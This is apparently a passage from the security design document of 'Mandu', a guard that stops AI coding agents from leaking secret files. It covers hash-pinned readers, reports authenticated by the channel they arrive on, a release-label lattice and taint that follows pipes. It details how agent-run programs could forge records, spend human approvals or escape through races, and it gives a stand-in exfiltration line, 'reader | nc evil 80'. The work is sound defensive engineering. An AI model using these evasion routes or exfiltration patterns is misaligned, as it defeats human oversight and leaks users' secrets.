    they are loader variables of every program now, as `LD_*` are (set to
    a value the launch did not give: not clean).
  - *The rule list.* The dashboard's "Your rules" judged a path's readers by
    the names it mirrors (its snapshot carried no readers at all). The
    policy snapshot's `document.paths` now carries each path's readers with
    the arbiter's per-entry judgment (`readersAdmitNothing`,
    `readersReadTwin`, `readersCopyOf`, as `whyPath` does), and the row
    shows it: a renamed copy is named "(a copy of python3.12)".
  Not covered, stated: a program built to carry no marker (a printer of the
  human's own, an interpreter of a family no marker names, under a new
  name and no installed program's hash): content identity is for copies
  and builds of known programs, and the human vouches for what they pin;
  `mandu why` and the dashboard cannot know a pin's content before an open
  (the finding is made at the open). Cost: a GNU printer's or launcher's
  build no hash knows reads nothing raw, even vouched for; a program of
  those packages under a name neither list knows (GNU `ls`, `stat`,
  `sleep`) is a printer, which opens no secret anyway; a root-installed
  `from:` parent is read once (about 0.4 to 0.6 s for a 234 MB binary in a
  release build; the table grew from 36 to 54 markers); a .NET program run
  with an agent-set `DOTNET_ROOT` reads nothing raw.
  Tests: `reader_identity.rs` (each new family by a reversed literal, the
  package table and the checksum exception, the installed programs, a live
  renamed GNU `sleep` reported `pkg:coreutils`, `ancestor_trusted`, the
  .NET variables), `secret_open.rs` (the names), the arbiter's
  `program-identity.test.ts` (names, `pkg:` over the pure rule and a real
  server, the new `runs:` families, the snapshot's judgment), the
  dashboard's rule row, the parity and production-wiring e2e in
  `tests/stack/reader-identity.test.ts`, and under the real guard
  `secret-readers-live.test.sh` (6h) (a GNU cat with a byte appended,
  renamed and vouched for, gets no byte) and (6i) (the pinned holder
  carrying the .NET muxer's front end, renamed and vouched for, gets no
  byte).

Tests (each red on the code before): `reader_identity.rs`,
`script_identity.rs`, `args_code.rs`, `secret_open.rs` (including
`socket_readers_admit_no_printer_or_relay`), the kernel
`script_pin_integration.rs`, `arbiter/test/unit/script-reader-pin.test.ts`,
`printer-readers.test.ts`, `printer-leftovers.test.ts` (leftovers (1),
(2) and (4): every fetcher admits nothing under every `ask` mode,
`.netrc`'s twin under the wire release, a pin whose hash is a printer's,
the scan on a fixture directory, moot rows left on disk gone at start and
their answers refused), `egress-approvals.test.ts` (withdraw, ids across
restarts), `reader-launchers.test.ts`, `args-code-reader.test.ts`,
`flow-taint.test.ts`, `provenance-ipc.test.ts`, `protected-write.test.ts`,
`code-runner-copies.test.ts` ((5), (6), (7): a pin whose hash is an
interpreter's, raw on the code before; the scan of both kinds on a fixture
directory; the new names; the editors), `code-runner-content.test.ts` ((8):
a `runs:` opener refused in every form and never asked, raw on the code
before; `readerProgram`; `confidentialityState`'s marks; each family of
2026-10-04 refused alike), the guard's
`reader_identity.rs` (each marker found, none in the guard's own binary,
nor what a library or a compiled program shares, the host's interpreters
by content, a ksh named for itself over the shared `set -o` header, no
marker missed across a search window, the table's order kept, a renamed
python with a byte appended reported `runs:python`) and `secret_open.rs`
(`socket_readers_follow_the_arbiters_identity_of_the_binary`), the
dashboard's `file-browser.test.ts` and `secrets-view-model.test.ts` (the
arbiter's marks win), `tests/stack/reader-identity.test.ts`
(the parity of the copies; over the production wiring `curl`, `wget`, a
pinned renamed host `cat`, a pinned renamed host interpreter, `tnftp` and
`aria2c` refused, moot questions removed across two restarts) and `writer-identity.test.ts`,
the dashboard's approval route test (409), and under the real guard
`tests/sandbox/guard/{script-reader-pin,args-code-reader,printer-downstream,tar-secret}.test.ts`,
`tests/sandbox/write-protect.test.ts`, `launcher/test/pipe-taint-live.test.sh`
(`curl file://x.txt` listed and a renamed, pinned GNU cat get no byte) and
`secret-readers-live.test.sh` ((6e): a renamed, pinned copy of the host's
bash sourcing `.env` gets no byte; (6f): the host's python with a byte
appended, renamed and pinned, gets no byte; (6g): the same for each of
ksh93, mksh, lksh, yash, posh, fish and LuaJIT the host has, the arbiter's
refusal naming the binary's own family, skipped where it has none; the CI
image carries mksh, lksh, yash and luajit since 2026-10-17, so both guests
run four of them (until then no lane ran the step); (4c): `perl5.X.Y`
listed on the socket, and the listed relays nc and socat, do not reach the
agent).
The guard suites that need a raw holder use `mdu-holder`, pinned by path
and hash: a tiny reader each test builds with the host's C compiler
(`tests/lib/holder-reader.c`: `mdu-holder FILE…` prints, `-o DST` copies;
`derived-label-live` copies with it as `mdu-copier`), since a GNU cat copy
is a printer by its hash; or python3 running the stdlib's `base64.py` (an
R5 pin). `secret-readers-live` checks a file's identity with GNU
`sha256sum` (it prints only the hash, so a raw read shows as the real
file's hash). `printer-downstream.test.ts`'s `/proc` step (a later call
scanning every `/proc/<pid>/cmdline`) reads with shell builtins, retries
until the holder shows, and the holder waits for the scan to end (D8
leftover (6), 2026-10-03: a per-process `tr` scan on a host with many
processes outlasted the holder).

**D9. The guard's reports were not authenticated.** Every record the
confinement rests on travelled over the arbiter's DATA socket, which every
process the agent runs reaches (Mandu's own shims and the inspect helper are
its clients, so it cannot be walled off): lineage chains, the agent's shells
(`callRoot`), raw opens with the opener's identity facts, taint rows,
protected writes, and the proxies' records of a call. A program the agent ran
could record a false parent before the guard did and take a reader out of its
call's tree; report a shell for a call whose real shell record was lost; ask
`callTaint` first for its call naming a clean call's text; claim a copy of
`cat` was a system binary and get it pinned; or file a taint row that made a
derived copy readable. Each was shown by
`arbiter/test/component/guard-report-attestation.test.ts`.

*Fixed:* **the reports are authenticated by the channel they arrive on.** The
arbiter believes them only from its HUMAN-plane socket
([`arbiter-human-plane.md`](../architecture/arbiter-human-plane.md)), which
the agent world is walled off from and every legitimate reporter can reach
(the guard runs outside its own filter and the wrap; the proxies are launcher
services holding a human client). From the data socket each record is a
CLAIM: it may add taint, and it never lowers a mask or a taint, pins a
reader, consults or spends a human verdict, files an Inbox row, binds a tool
call, or answers raw (`ATTESTED_REPORT_OPS`, `attestedChannel`):

| Op | From the human socket (or admin) | From the data socket |
|---|---|---|
| `recordExecRoot` | edges (first wins), signature, argv, call-root candidates | its chain as claimed edges only |
| `processLineage` | an edge (first wins) | a claimed edge |
| `taintProcessSecret` | a row | a claimed row: no binary, no `via` (folds `secret`), never held raw |
| `decideSecretOpen` | the open decided as before | its chain claimed; answered `twin` |
| `decideProtectedWrite` | decided as before | `deny`, no row, no verdict consulted |
| `taintedProcessBindings`, `labelWrittenPathTainted` | `ancestors` as edges | `ancestors` as claimed edges; the answer (a tightening) unchanged |
| `execGate` | records the call's gate time and its command | records nothing for the call |
| `recordCallCommand` | records the command the agent was given (`delivered`) | records nothing |
| `recordEgressRefusal` (plan 10 §11.8, 2026-10-04) | records the refusal (process, kind; with no process, `unattributed`, the kind for the calls running then) the call's `refused:` note reads | records nothing (a forged refusal would put a false line beside a result) |
| `callTaint` | fixes the first ask, binds the call by the recorded command | read-only: today's bindings, nothing new |
| `recordProcessFlow` (§9 R1) | a flow (a process holds what its writers hold) | a claimed flow: it only adds taint |
| `recordAgentFlow` (§4.5.1) | an agent flow opened, or closed | an open is a claimed flow (it only adds masking); a close is not recorded |
| `agentReceiptTaint` (§4.5.1) | fixes each call's first ask | read-only: the window ends `now` (only wider) |

*The gates' human verdicts (2026-10-07).* The table covers the attested
reports; the sentence above ("never … consults or spends a human verdict")
did not hold for the gates that consult a human's answer before the law and
answer any channel: `desymbolizationDecision`, `fsPathDecision`,
`escalateExec` and `execGate`'s program-text gate. From the data socket
their ask spent a *once* for whoever asked first, so a program of the agent
could use up each *Allow once* before the net-proxy's real send (which
asked on its data client too) and the send was held again: a denial and
approval fatigue, nothing released. Now the gates ask on the human socket
(the net-proxy, the Claude proxy's network and path gates), and from the
data socket an unspent *once* is read and never spent: a denial answers,
an approval is no verdict (the law decides and the row stays armed). The
in-context read (`declassifySymbol`) keeps spending from the data socket:
its only caller runs in the agent's tree by design
([`arbiter-human-plane.md` §10.3](../architecture/arbiter-human-plane.md)).
So the statement holds for every op: from the data socket no human verdict
is spent, except the in-context read's.

Claimed edges live in their own table (`process_lineage_claims`) and never
take the guard's first-edge slot; claimed rows are `claimed = 1`. The one
decision where MORE taint would let a process read something raw (a holder of
every source reading a derived copy, D4) reads the guard's records alone
(`attestedOnly`). The guard finds the human socket from the data socket's
`hello` and confirms it (`channel: human`); its connection is its own,
close-on-exec, and the guard is not dumpable, so no agent process can borrow
it. *Fail-closed:* a guard that cannot reach the human socket reports on the
data socket, where every open gets its twin and every protected write is
refused; a proxy with no human client binds no call, so every shell result is
masked while the session holds a raw read. A channel was chosen over a
reporter token: a token needs a claim protocol whose race costs the session
its guard, and it would ride the channel the human plane already walls off.

*The call is bound by the command the proxy recorded, not the one the agent
echoes.* `callTaint` used to bind by the command text in the agent's next
request, which the agent builds. Now the proxy records each call's command on
the human plane by its id before relaying it: `execGate` (source `gate`) and
`recordCallCommand` with the command the agent RECEIVES after every rewrite
(source `delivered`: the AgentView spelling, a dispatcher's inner command,
each exec literal of a Codex script cell). `callTree` binds by those
(`callCommandSignatures`); the echoed text names only the folded guess. The
openai-proxy hands each Codex call's `call_id` to the exec gate, so Codex gets
the same binding. A record that fails never holds the call, which is then
masked while the session holds a raw read; so is a call whose command an
agent hook rewrites before it runs (Claude Code's `PreToolUse`
`updatedInput`).

*Residuals:* the human plane's (arbiter-human-plane.md §8): while a launch
with no wall (`gated` without a guard, every `off`) is live, the human
socket's reports are claims too (arbiter-human-plane.md §10.1); Yama
`ptrace_scope` 0; a same-uid process outside the agent's tree. The remaining
agent-reachable writers on the data socket are classified in
arbiter-human-plane.md §10; none lowers a confidentiality decision. Tests:
`guard-report-attestation.test.ts`, `provenance-store.test.ts` (the D9
blocks), `tests/stack/proxy-real-client-parity.test.ts`,
`tests/stack/call-command-binding.test.ts`, `report_channel.rs`, and under
the real guard `tests/sandbox/guard/forged-reports.test.ts`.

## 4. The policy model

### 4.1 Data, holders and sinks

| Kind | What it is | Identity |
|---|---|---|
| **data** | a protected file, one value inside it (a key in `.env`, a field of a structured twin), a file derived from protected data, a prompt | the path, or the value's symbol |
| **holder** | whoever holds raw bytes: the agent's session, one tool call's process tree, a long-lived process | the session, the call root, the process key |
| **sink** | where bytes can go that Mandu can see | see below |

The sinks:

| Sink | Examples | Seen at |
|---|---|---|
| model | the session's main model, the quarantined helper, `local:vllm-1` | the model-API proxies; a model is a **declared** endpoint (Plan 11/12) |
| destination | `api.stripe.com`, `*.amazonaws.com`, `db.internal:5432`, `unix:/var/run/postgresql`, the display server's socket, a network or FUSE mount (`mount:<fstype>:<source>`), a synced folder | `connect()` at the guard, a request at the net-proxy, a write-open on a mount that leaves the machine (§4.6), a write-open under a synced root |
| storage | any other file on this machine | the write-open; always admitted, the written file takes the holder's label (§4.6) and no group or other bits (§4.6, another local user) |
| human | the terminal, HumanView | the reply filter |

A model is a declared endpoint and nothing else: `api.openai.com` reached by
`curl` is a destination, so one sink never has two names.

**Programs are not sinks.** Once bytes are inside a tool call's process tree,
the OS layer cannot tell which program holds them (`python3 … | tee`: `tee`
holds the data and is no reader). A program is checked where it can be, at
the open, and the label that travels with the data names only sinks.

### 4.2 The label: three relations per datum

```
Release(d)   ⊆ Sinks          where d's raw bytes may go            (travels with d)
Openers(d)   ⊆ Programs       who may open d raw at the read gate   (does not travel)
Trust(d, p)  ∈ {secret, mask, clear}
                              how much of opener p's output still carries d  (model sink only)
```

**Release** is the label proper:

```
Release(d) = Models(level(d)) ∪ Bindings(d) ∪ {human, local storage}

Models(public)      = every sink (public data is not secret: every destination too)
Models(any-model)   = every declared model: the session's main model, the helper
Models(local-model) = the declared local: true models
Models(no-model)    = none
```

Order is reverse inclusion (`L1 ⊑ L2 ⟺ L1 ⊇ L2`: fewer sinks is more
secret) and the join, the label of anything made from two data, is
intersection:

```
Release(d1 ⊔ d2) = Release(d1) ∩ Release(d2)
```

This is FIDES's confidentiality lattice (§6) with Mandu's sinks as the
principals.

**Openers** is the `readers:` list, pinned by path and hash (D8), narrowed
to the vetted readers and the entries that vouch for their program
(`prints: nothing`, D8 (12)); a listed program that is neither gets the
twin. A non-opener gets the twin, or `EACCES` when the file has `others:
deny` (the default once a list exists). Opening makes the opener's holder hold `d`; it
grants nothing to any sink. A program that runs or prints code it is given
is never an opener except as a pinned script (D8).

**Trust** is the reader entry's `output:` rule (D3). It decides only what the
*model* sees of an opener's output: `secret` (the output carries `d`'s label,
the default), `mask` (spans that match `d` are replaced), `clear` (the human
trusts `p` not to print `d`, as a deploy tool prints its log and not its
token; `psql`, the example first written here, is a printer and no reader
since D8 (12)). It
never widens a destination or a write, and it is refused for a code-running
reader (`readerOutputRefusal`).

### 4.3 The levels stay a total order on the model column

On the model sinks alone, `Release` is exactly the level: the four levels are
four nested sets of models, the join is `max(level)`, and the session
watermark is a `max`. `confidentiality.md` §13.5 keeps the axis a total order
so that fail-closed stays unambiguous, and this plan keeps that: the lattice
is set-valued only in the destinations, which were already per-datum
(`bindings`). The framing in `confidentiality.md` §13.4, coarser than CaMeL's
readers-capabilities and auditable, holds for models; for destinations the
policy was never a total order, and the join is intersection (D1), for the
session holder too (§9 R3).

### 4.4 Holders

A holder starts with every sink. Each raw read shrinks it:

```
Label(h) = ∩ { Release(d) : h has read d raw }
```

- The **session** is a holder through rung 3 (`declassify_symbol`): an
  in-context read shrinks the session's label, which is the watermark.
- A **tool call's process tree** is a holder for the model exit: every process
  started for one tool call, including subshells and reparented children
  (D7). For the network and write exits the taint follows the actual flows
  (§4.5.1), so `cat .env | grep FOO; npm install` does not confine `npm`.
- A **long-lived process** (a dev server that loaded `.env`) is its own
  holder for its lifetime.

An opener's output under `Trust = clear` adds nothing to the model exit's
fold; it still counts at the destination and write exits, since `clear` is a
statement about what the model may see and not about where the bytes may go.

### 4.5 One check, at the later of two events

A flow needs a **source event** (a raw read into a holder) and a **sink
event** (a connect, a proxied request, a write-open, a model request), and
they come in either order (Figure 4). The rule:

- **Sink after source.** At the sink event: `sink ∈ Label(h)`?
- **Source after sink.** At the raw read of `d`: every sink the holder
  already has open must be in `Release(d)`. An open socket to a destination
  outside it refuses the read; a file the holder has open for writing takes
  the new label on the spot (D5).

The guard does not keep a per-holder table of open sinks: it reads the
holder tree's descriptor tables from `/proc` at the taint (the taint-time
sweep), which finds the same sinks with no state to drift. A proxied request
is a sink event of its own, checked at the net-proxy with the sending
process resolved on every leg, HTTPS included (D6).

### 4.5.1 Pipes and socket pairs: the taint follows the descriptor (D2, decided 2026-10-02)

D2 needed a holder that covers a pipeline's sibling stages. Three ways were
weighed against what a programmer runs every day: `cat .env | grep FOO`,
`npm ci | tee build.log`, `psql … | less`, `psql … | python3 analyze.py`.

- **(a) The tool call's tree as one holder** (§4.4 for the model exit). For
  the other exits it over-taints sequential commands (in `cat .env | grep
  FOO; npm install` npm never received a byte, yet its registry connect
  would need a binding), and it misses a flow to a process outside the call's
  tree (a background job of an earlier call, an MCP server reading a FIFO).
- **(b) Refusing a holder's pipes.** Breaks `cat .env | grep FOO` and every
  stdio MCP server.
- **(c) Pipe-flow taint (chosen).** The taint travels along a descriptor,
  from the process holding the WRITE end of a pipe, a FIFO or an unnamed
  Unix socket pair (a socket pair carries both ways; a socket connected to a
  NAMED peer is judged as a connect) to every process of the guard's tree
  holding the READ end, found from `/proc/<pid>/fd` (`pipe:[ino]` names both
  ends; a FIFO by its path; a socket pair's peer by `sock_diag`). It is
  checked at the later of the two events:
  - *at the taint*: the sweep lists the write ends the reader and its
    descendants hold, makes each receiving process a holder and sweeps its
    tree in turn (its sockets judged, so `reader | nc evil 80` with `nc`
    already connected refuses the READER's raw open; its files labeled; its
    own pipes followed, `a | b | c`);
  - *at the receiver's event*, for a pipe or FIFO joined after the taint: an
    untainted process's connect, send, accept or write-open first asks
    whether a pipe or FIFO it reads is one a holder wrote into (marks kept
    after the writer exits) or one a live holder's tree holds open for
    writing.

  The arbiter is told the writers as `flowsFrom` and unions their taint (and
  intersects their bindings) with the process's own, and every flow is
  recorded (`recordProcessFlow`) so the model exit's fold counts it too. No
  lineage edge is recorded: a pipe's writer is not its reader's parent.

**The agent is never made a holder this way.** It holds the read end of
every tool call's output, and what reaches it goes to the model through the
model exit, which folds the call's tree. Tainting it would refuse its own
connections and label every file it writes; what it receives over its OWN
connection to a holder is masked at the model exit instead (below). The
agent is the first-started live process of the guard's tree whose
executable, or whose interpreter's script, is the launch's `agentExe`, and
only that process. A process of the same executable started later (an injected `node
-e …`) is not exempt; with no `agentExe` nothing is. An npm package whose
`bin` is a node script that starts the real binary as its child (npm's
`codex`: `bin/codex.js` runs the platform package's
`vendor/<triple>/bin/codex`) is resolved by the launch itself: `agentExe`
names the binary the script runs, found the way the script finds it
(launcher `npmWrappedNative`), and a missing one leaves the script named
(the native Codex is then no agent: fail-closed, the session loses its
model connection on the first raw read). Before 2026-10-09 the guard instead
took the script's first-started child on trust, and it cached the agent set
the first time it was asked, which came before npm's script had started the
binary: the native Codex was never the agent, so a listed reader's raw read
in one call made it a holder (the flow followed the call's output pipe to
it), its model connection was refused and its own session file labelled
(the guard's records: `process_flows` into the native Codex's key, the
call-root candidates its own exec only). The same rule could have exempted
the first child of an agent that is its own script (OpenClaw's
`openclaw.mjs`: a tool's shell, an MCP server) had the set been first asked
later; it is gone (`pipe_flow::pick_agent`). npm's Claude Code
(`bin/claude.exe`) and OpenCode (`bin/opencode.exe`) install the native
binary itself and are named by image, as before. Whether the set was first
asked before or after the script had started the binary was a race, so the
e2e below failed on some CI runs only (GitLab pipeline 9918 on 2026-10-09:
the model connection lost after the read). It read that as "Codex's sandbox
cannot start nested here" and skipped; the e2e now skips only on positive
evidence, bubblewrap's refusal as the reading call's own result, and any
other broken run fails. Test:
`tests/sandbox/launcher/codex-sandbox-call-binding.test.ts` (`codex` as
found on PATH, npm's wrapper in CI, and the native binary directly).

*Tracing the agent pick (2026-10-15).* `MANDU_NET_GUARD_TRACE=<file>` makes
the guard append a line to that file whenever its agent set changes (the
candidates it chose from, with their start times), whenever a process
first becomes a holder (directly, by inheritance, or by a flow, with the
chain or the writers), and for each connect the taint leg refuses (with
the agent set at that moment). It is off by default, best-effort, and read
by nothing on the security path (`guard_trace`). The guard's stderr is the
agent's terminal, so the trace goes to a file.

*Closed (2026-10-15): a thread the agent started during a call made it the
call's orphan.* The trace was added for drill `conf-tainted-bound-blocked`,
which began failing when the host's Claude Code moved from 2.1.295 to
2.1.299: in a HIGH session, Claude Code itself was refused its model
connection (EACCES on the loopback proxy and on DNS), and every file it
wrote was labelled. The trace showed the agent picked correctly, then made
a holder by the orphan rule (`holds_or_inherits`: "inherits" and "flows
from" 28 dead tool processes). A seccomp notification names the calling
THREAD, and `orphan_root_of` walked up from it. A thread's `stat` carries
the thread's own start time with the process's parent (the guard, a
reaper), so a worker thread the agent started while a holder lived was a
root "born in the holder's window". After the holder exited, the thread's
first trapped call made the whole agent its orphan. Claude Code 2.1.299,
a Bun binary, starts threads all session long (`HeapHelper` and others).
CI's 2.1.295 passed the drill; whether it starts fewer threads was not
measured. A HIGH session only makes the race likelier (every call's shell
is a holder there): any dying holder will do. The walk now starts at the
thread's process (`tgid_of`). The 2026-10-01 fix (exec-routing.md §7.5)
already keyed the taint by the process, but not this walk. Tests:
`secret_open::a_later_thread_is_judged_as_its_process` (unit) and
`tests/sandbox/guard/call-tree.test.ts` "a thread the agent starts during
a call" (the real guard; it fails with EACCES without the fix).

*Closed (2026-10-09): a sandbox started just after a holder died inherited it
as an orphan.* The same e2e fails about 1 run in 5 under load, on either
leg (pipelines 9916, 9930 and 9940; 5 of 24 legs in a CI-shaped guest
under load, 0 of 20 idle): the clean call after the reader's is masked by
its OWN tree, which the recorder bound `exact`, and takes about 2.2 s
instead of a fraction of one. A flow trace of the guard (2026-10-09, 44
traced legs) shows the chain:

1. At the reader's raw open the sweep makes every ancestor up to the
   agent's child a holder through the exit-status channel (§4.9): the
   sandbox's two `bwrap`s and Codex's `codex-linux-sandbox` helper. No pipe
   is involved: they hold only write ends of the call's output pipes. By
   design.
2. They all exit within a few milliseconds of the reader. The guard stamps
   a dead holder's end of window (`gone_at`) every 200 ms
   (`TaintedSet::observe_deaths`), or at the next look, with that look's
   time.
3. 170 to 260 ms later the next call's helper starts its preflight sandbox
   (`bwrap --unshare-pid … /usr/bin/true`). `true` is a child of the PID
   namespace's init, which the orphan rule counts as a reaper
   (`is_reaper`, `lineage::is_pidns_init`), so `true` is an orphan root.
   When its birth falls before the dead holders' `gone_at` was stamped,
   their window still reaches it (`orphan_holders`: `until` = now), and it
   inherits the reader's taint.
4. Its exit status carries the taint up (§4.9) to the helper. The sweep
   then waits the whole `FORK_EXEC_WAIT` (2 s) on the helper, which looks
   like a fork of the agent on its way to an exec (the agent's image, the
   agent's child, a close-on-exec pipe it reads: the preflight's stderr)
   and has in fact exec'd long ago: the extra 2 s.

The orphan child appears in exactly the 5 failing legs of 44, and in none
of 36 legs run under the same load with the scripted model slowed so that
the next sandbox starts 775 to 848 ms after the reader (0 failures). The
note first written here blamed Codex's synthetic-mount lock
(`/tmp/codex-bwrap-synthetic-mount-targets-<uid>/lock`, which the helper
opens read-write to `flock` it, after the reader, as a holder, and never
writes): the guard does mark it (§9 R1, on the write-capable open alone),
but in all 80 traced legs, failing or not, and the mark never reached a
later opener. Any sandbox with its own PID namespace has the same shape:
Claude Code's sandbox runtime (`bwrap --unshare-pid`), `unshare -p`.
The fix (the maintainer's decision, 2026-10-09): the guard stamps a
holder's death when it happens, through a pidfd per holder (`death_watch`;
the 200 ms poll stays the fallback), so the window ends at the death and
never before it, and at the death it records the orphans the death made
(`TaintedSet::adopt_orphans`), so an orphan that forks and dies before any
trapped call still passes the taint to its child (exec-routing.md §7.5 (d),
"The window's end"). After it, 48 of 48 legs passed under the same load
(before: 5 of 24); the kernel test `the_orphan_window_ends_at_the_holders_
death` fails without the pidfd stamps (a pid namespace child born after the
death was taken in, 2 runs of 2) and passes with them (3 of 3). The stamp
still waited on the watcher's thread, though (2026-10-09, CI pipeline
10012: the kernel test's round (a) refused a child started 40 ms after the
death, once, on a loaded host; the same day !1171's first pipeline failed
`a_death_adopts_the_orphans_it_made_and_no_later_birth`). Reproduced in a
1-vCPU VM with two CPU burners and the guard's watcher and poll threads put
in `SCHED_IDLE`, what a starved vCPU does to them: the thread stamped 0 to
1115 ms after the test saw the death (median 7 ms, p90 595 ms), and round (a)
failed in 69 of 149 runs, 14 of the 15 traced through the judgement's own
stamp (`until = now`, the holder dead and not yet stamped) and one through
the thread's late stamp; with the threads at normal priority (2 vCPUs, two
burners) it passed 372 of 372, the stamp within 2 ms of the death. The fix
(exec-routing.md §7.5 (d), "Not on the watcher's schedule"): the guard takes
the deaths the pidfds report as each trapped call arrives, before it judges
or answers it, so a process started after the tree's next trapped call (in
Codex, the next sandbox's `execve`) is born after the stamp, however late
the thread runs; round (a) now waits 15 ms after such a call, and the
window keeps no tick of margin after the stamp. The same starved runs then
exposed a LEAK in round (c), the adoption at the death: 3 runs in 105 when
the poll stamped a holder seen exiting (its children not yet re-parented,
so the one adoption pass skipped the orphan-to-be), and 1 in 102 when an
orphan adopted late had already forked its child, outside a window that
started at the adoption. Now only a dead holder is stamped, a judgement's
stamp adopts like any other, and a holder recorded as a descendant or an
orphan has its window from its own birth. After: 119 of 119 runs under the
same starvation. The unit test was a race of its own: its holder started
its child before the test recorded the taint, so under load the child was
born more than the tick of margin before the window (alone on one loaded
vCPU it never lost that tick, 2537 of 2537; in CI it ran beside the
crate's 427 other tests); the child now starts after the taint by
construction. And the
sweep no longer waits the 2 s on a child of the agent's image that has
exec'd (below); the e2e asserts the clean call takes under 1.9 s from the
proxy's gate to its result, and is no longer marked `flaky` (95 of 96 legs
under the same load with both fixes). Open: the one other leg, on the
native binary, lost its model connection after the reader's call ("stream
disconnected"), the shape the npm wrapper's race had before !1124; not
traced yet. Round (a) kept failing after these fixes (15 of 132 CI runs,
2026-10-09 to 10-10), and not because of the window: with every holder
record logged in a loaded VM (8 failures in 200 runs), the death was
stamped in its own tick each time, but the adoption at the stamp took in a
child of another test running beside it in the same test process (the
guard and subreaper of them all), and the round's child, born while that
adopted process lived, was judged its orphan; fail-closed answers both.
The file's kernel tests now run one at a time (exec-routing.md §7.5 (d),
"One process's tree").

The one later process that is part of the agent (2026-10-05): the agent's own private server, when the launch names
one (OpenCode 2's `serve --stdio`, the client's direct child on the same
executable; supported-agents.md §2.3.1), since that server, not the client,
holds the tool calls' output and makes the model calls; its children's
execs are call roots (D7) for the same reason. A fork of the agent on
its way to an exec, which briefly holds close-on-exec copies of every agent
descriptor, is given up to 2 s (`guard_flow::FORK_EXEC_WAIT`) to drop them
before it counts as a receiver. Only a fork: a child on the agent's image
whose command line is no longer the agent's has exec'd already
(`pipe_flow::not_yet_execd`; Codex runs each command through its own
binary as `codex-linux-sandbox`, which reads its preflight's stderr
through its own close-on-exec pipe), and is judged at once (2026-10-09:
the sweep used to wait the whole 2 s for an exec that had happened). The
check can only make a process a receiver sooner: a process that rewrote
its own argv to look exec'd gives up the wait, nothing else. A child of
the agent caught INSIDE its exec (2026-10-11) shows the new image and an
empty command line while it still holds the agent's descriptors, which
the kernel closes a moment later in the same exec (and whose `fdinfo`
flags need not be readable meanwhile): the sweep waits, within the same
2 s, for that exec to end (`pipe_flow::exec_in_progress`,
`guard_flow::wait_exec_done`) and judges the child on the descriptor
table it ends with, so a descriptor that survives the exec still makes
it a receiver. Taken for exec'd, the next tool call's shell became a
receiver of another call's reader and a clean call was masked (the
call-tree D7 flake, about 1 run in 100 on a loaded CI guest). Kernel test
`pipe_taint_integration.rs` (`an_execd_child_of_the_agents_image_is_
judged_at_once`: refused in about 35 ms; with the check off, after 2 s).
A look inside an exec whose table cannot be read (2026-10-17): from the
switch to the new image until the kernel marks the process dumpable again
(after it closed the close-on-exec descriptors), `/proc/<pid>/fd` belongs
to root, mode 0500, and a guard that is not root in the tree's user
namespace (a launch's; the kernel tests' guard is, and reads it) got EACCES
and read "receives nothing" (`pipe_flow::fd_table`): a process of the
tree caught there was no receiver, even through a descriptor without the
close-on-exec flag that survives the exec (a pipe's read end `dup2`'d onto
a command's standard input). The sweep now tells an unreadable table from
an empty one (`pipe_flow::reads_any_look`) and waits, within the same 2 s,
for the exec of every such process of the tree to end, then judges the
table it ends with (`guard_flow::receiver_drops`, `unseen_drops`,
`wait_exec_done`), whatever `before_bytes` says: the wait can only find a
receiver the look missed. The waits' looks back off from 100 us to 2 ms
(`pipe_flow::exec_wait_pause`), and a process that never leaves the
"inside" state (an emptied command line, `PR_SET_MM_MAP`) counts as a
receiver at the bound. A process whose table cannot be read with no exec
in progress (non-dumpable on purpose) is still not seen (§4.5.1's
documented gap). The own server's connect has the same waits
(exec-routing.md §7.5). Kernel test `pipe_taint_integration.rs`
(`a_pipeline_sibling_caught_inside_its_exec_is_still_a_receiver`: `reader
| tee copy.txt` with `tee` hidden that way for 500 ms; before, copy.txt
took the canary unlabeled, 3 of 3 runs on a host where the guard is not
root in a user namespace; now the reader's open waits about 0.55 s and
copy.txt takes the label).

**Every other reader of a process's table (2026-10-17).** The same window
reached every look the guard takes at another process's `/proc/<pid>/fd`
(and `maps`): read as "holds nothing", and for each of them "nothing" was
the lenient side. They now read the table once any exec the process is
inside has ended (`pipe_flow::fd_table_read`: a table that cannot be read
while the process has an empty argv, is live and is no kernel thread is
looked at again, backing off 100 us to 2 ms, for at most
`EXEC_SETTLE_WAIT`, 2 s, and only a table of the same process, by its start
time, is used). At the bound the yes/no looks (`holds_any`, `reads_any`,
`writes_any`) answer "holds", the outside scan lists the process, and the
taint-time sweep refuses the raw open; a list (`fd_table` and what is built
on it) is then as before. A table that cannot be read with no exec in
progress (another user's, non-dumpable on purpose, a set-id image) is
judged as before, on what can be read: that documented gap is a
maintainer decision, unchanged. The audit:

| Look (module) | Who is looked at | "Nothing" meant | Now |
|---|---|---|---|
| `fd_table`, `write_ends`, `read_ends`, `written_files`, `written_channels`, `socket_flow_links`, `fifo_ends`, `held_objects` (pipe_flow, guard_flow, object_flow) | holders, a holder's tree, receivers | no channel, file or object to follow or label | settled |
| `holds_any`, `reads_any`, `writes_any` (pipe_flow): `later_flow`, `fifo_write_open`, `pass_flows`, `agent_holds`, `closed_agent_links`, `proxy_holds`, `agent_connect_flow`, `agent_fifo_open` | writers, readers, the agent, the net-proxy | no holder, receiver, writer; the agent's flow closed; not the proxy's client | settled; "holds" at the bound |
| `outside_receivers` (pipe_flow; `outside_receiver`, `fifo_readers`) | every process outside the tree | no outside receiver: the event goes on | settled; listed at the bound |
| `socket_fds` (guard_send), `written_mappings` (object_flow) | the taint-time sweep | no connection or mapping to judge | settled; the sweep refuses at the bound |
| `holders_of` (guard_rights) | receivers of a pass | no receiver to sweep | settled (`holds_any`) |
| `scan_fd_owner` (conn_attr) | a connection's owner | no attribution (documented weaker baseline) | settled |
| `receives_only_until_exec` (pipe_flow) | a fork in its window | "not only close-on-exec": no wait | unchanged (strict), one look |
| `*_look`, `wait_exec_done` (pipe_flow, guard_flow) | the fork-window waits | told apart already | unchanged |
| `unix_owner::holds` | holders of a listener | "not shown to be ours": refused | unchanged (strict) |
| `proxy_pids`' scan (guard_flow) | every process | no proxy found: refused | settled (it only finds more) |
| the trapped caller's own table (`inject_twin_high`, fs-supervisor `tracee`, `guard_signals::fd_target`) | a process stopped in a syscall | not inside an exec | unchanged |
| one descriptor of a swept process (`fd_file`, `accmode_of`, `local_exits::proc_fd_fs_facts`, `held_local_exits`' copy) | after its table was read (settled) | a descriptor gone: not held; one not copied: refused | unchanged |

Kernel tests in `pipe_taint_integration.rs`, each hiding a fixture as a
process inside its exec looks (`support::hide_as_inside_exec`), before
the change on a host where the guard is not root in a user namespace →
now: `a_reader_outside_the_tree_caught_inside_its_exec_refuses_the_raw_open`
(the canary reached the outside reader → refused);
`a_readers_child_caught_inside_its_exec_with_an_unbound_connection_refuses_the_raw_open`
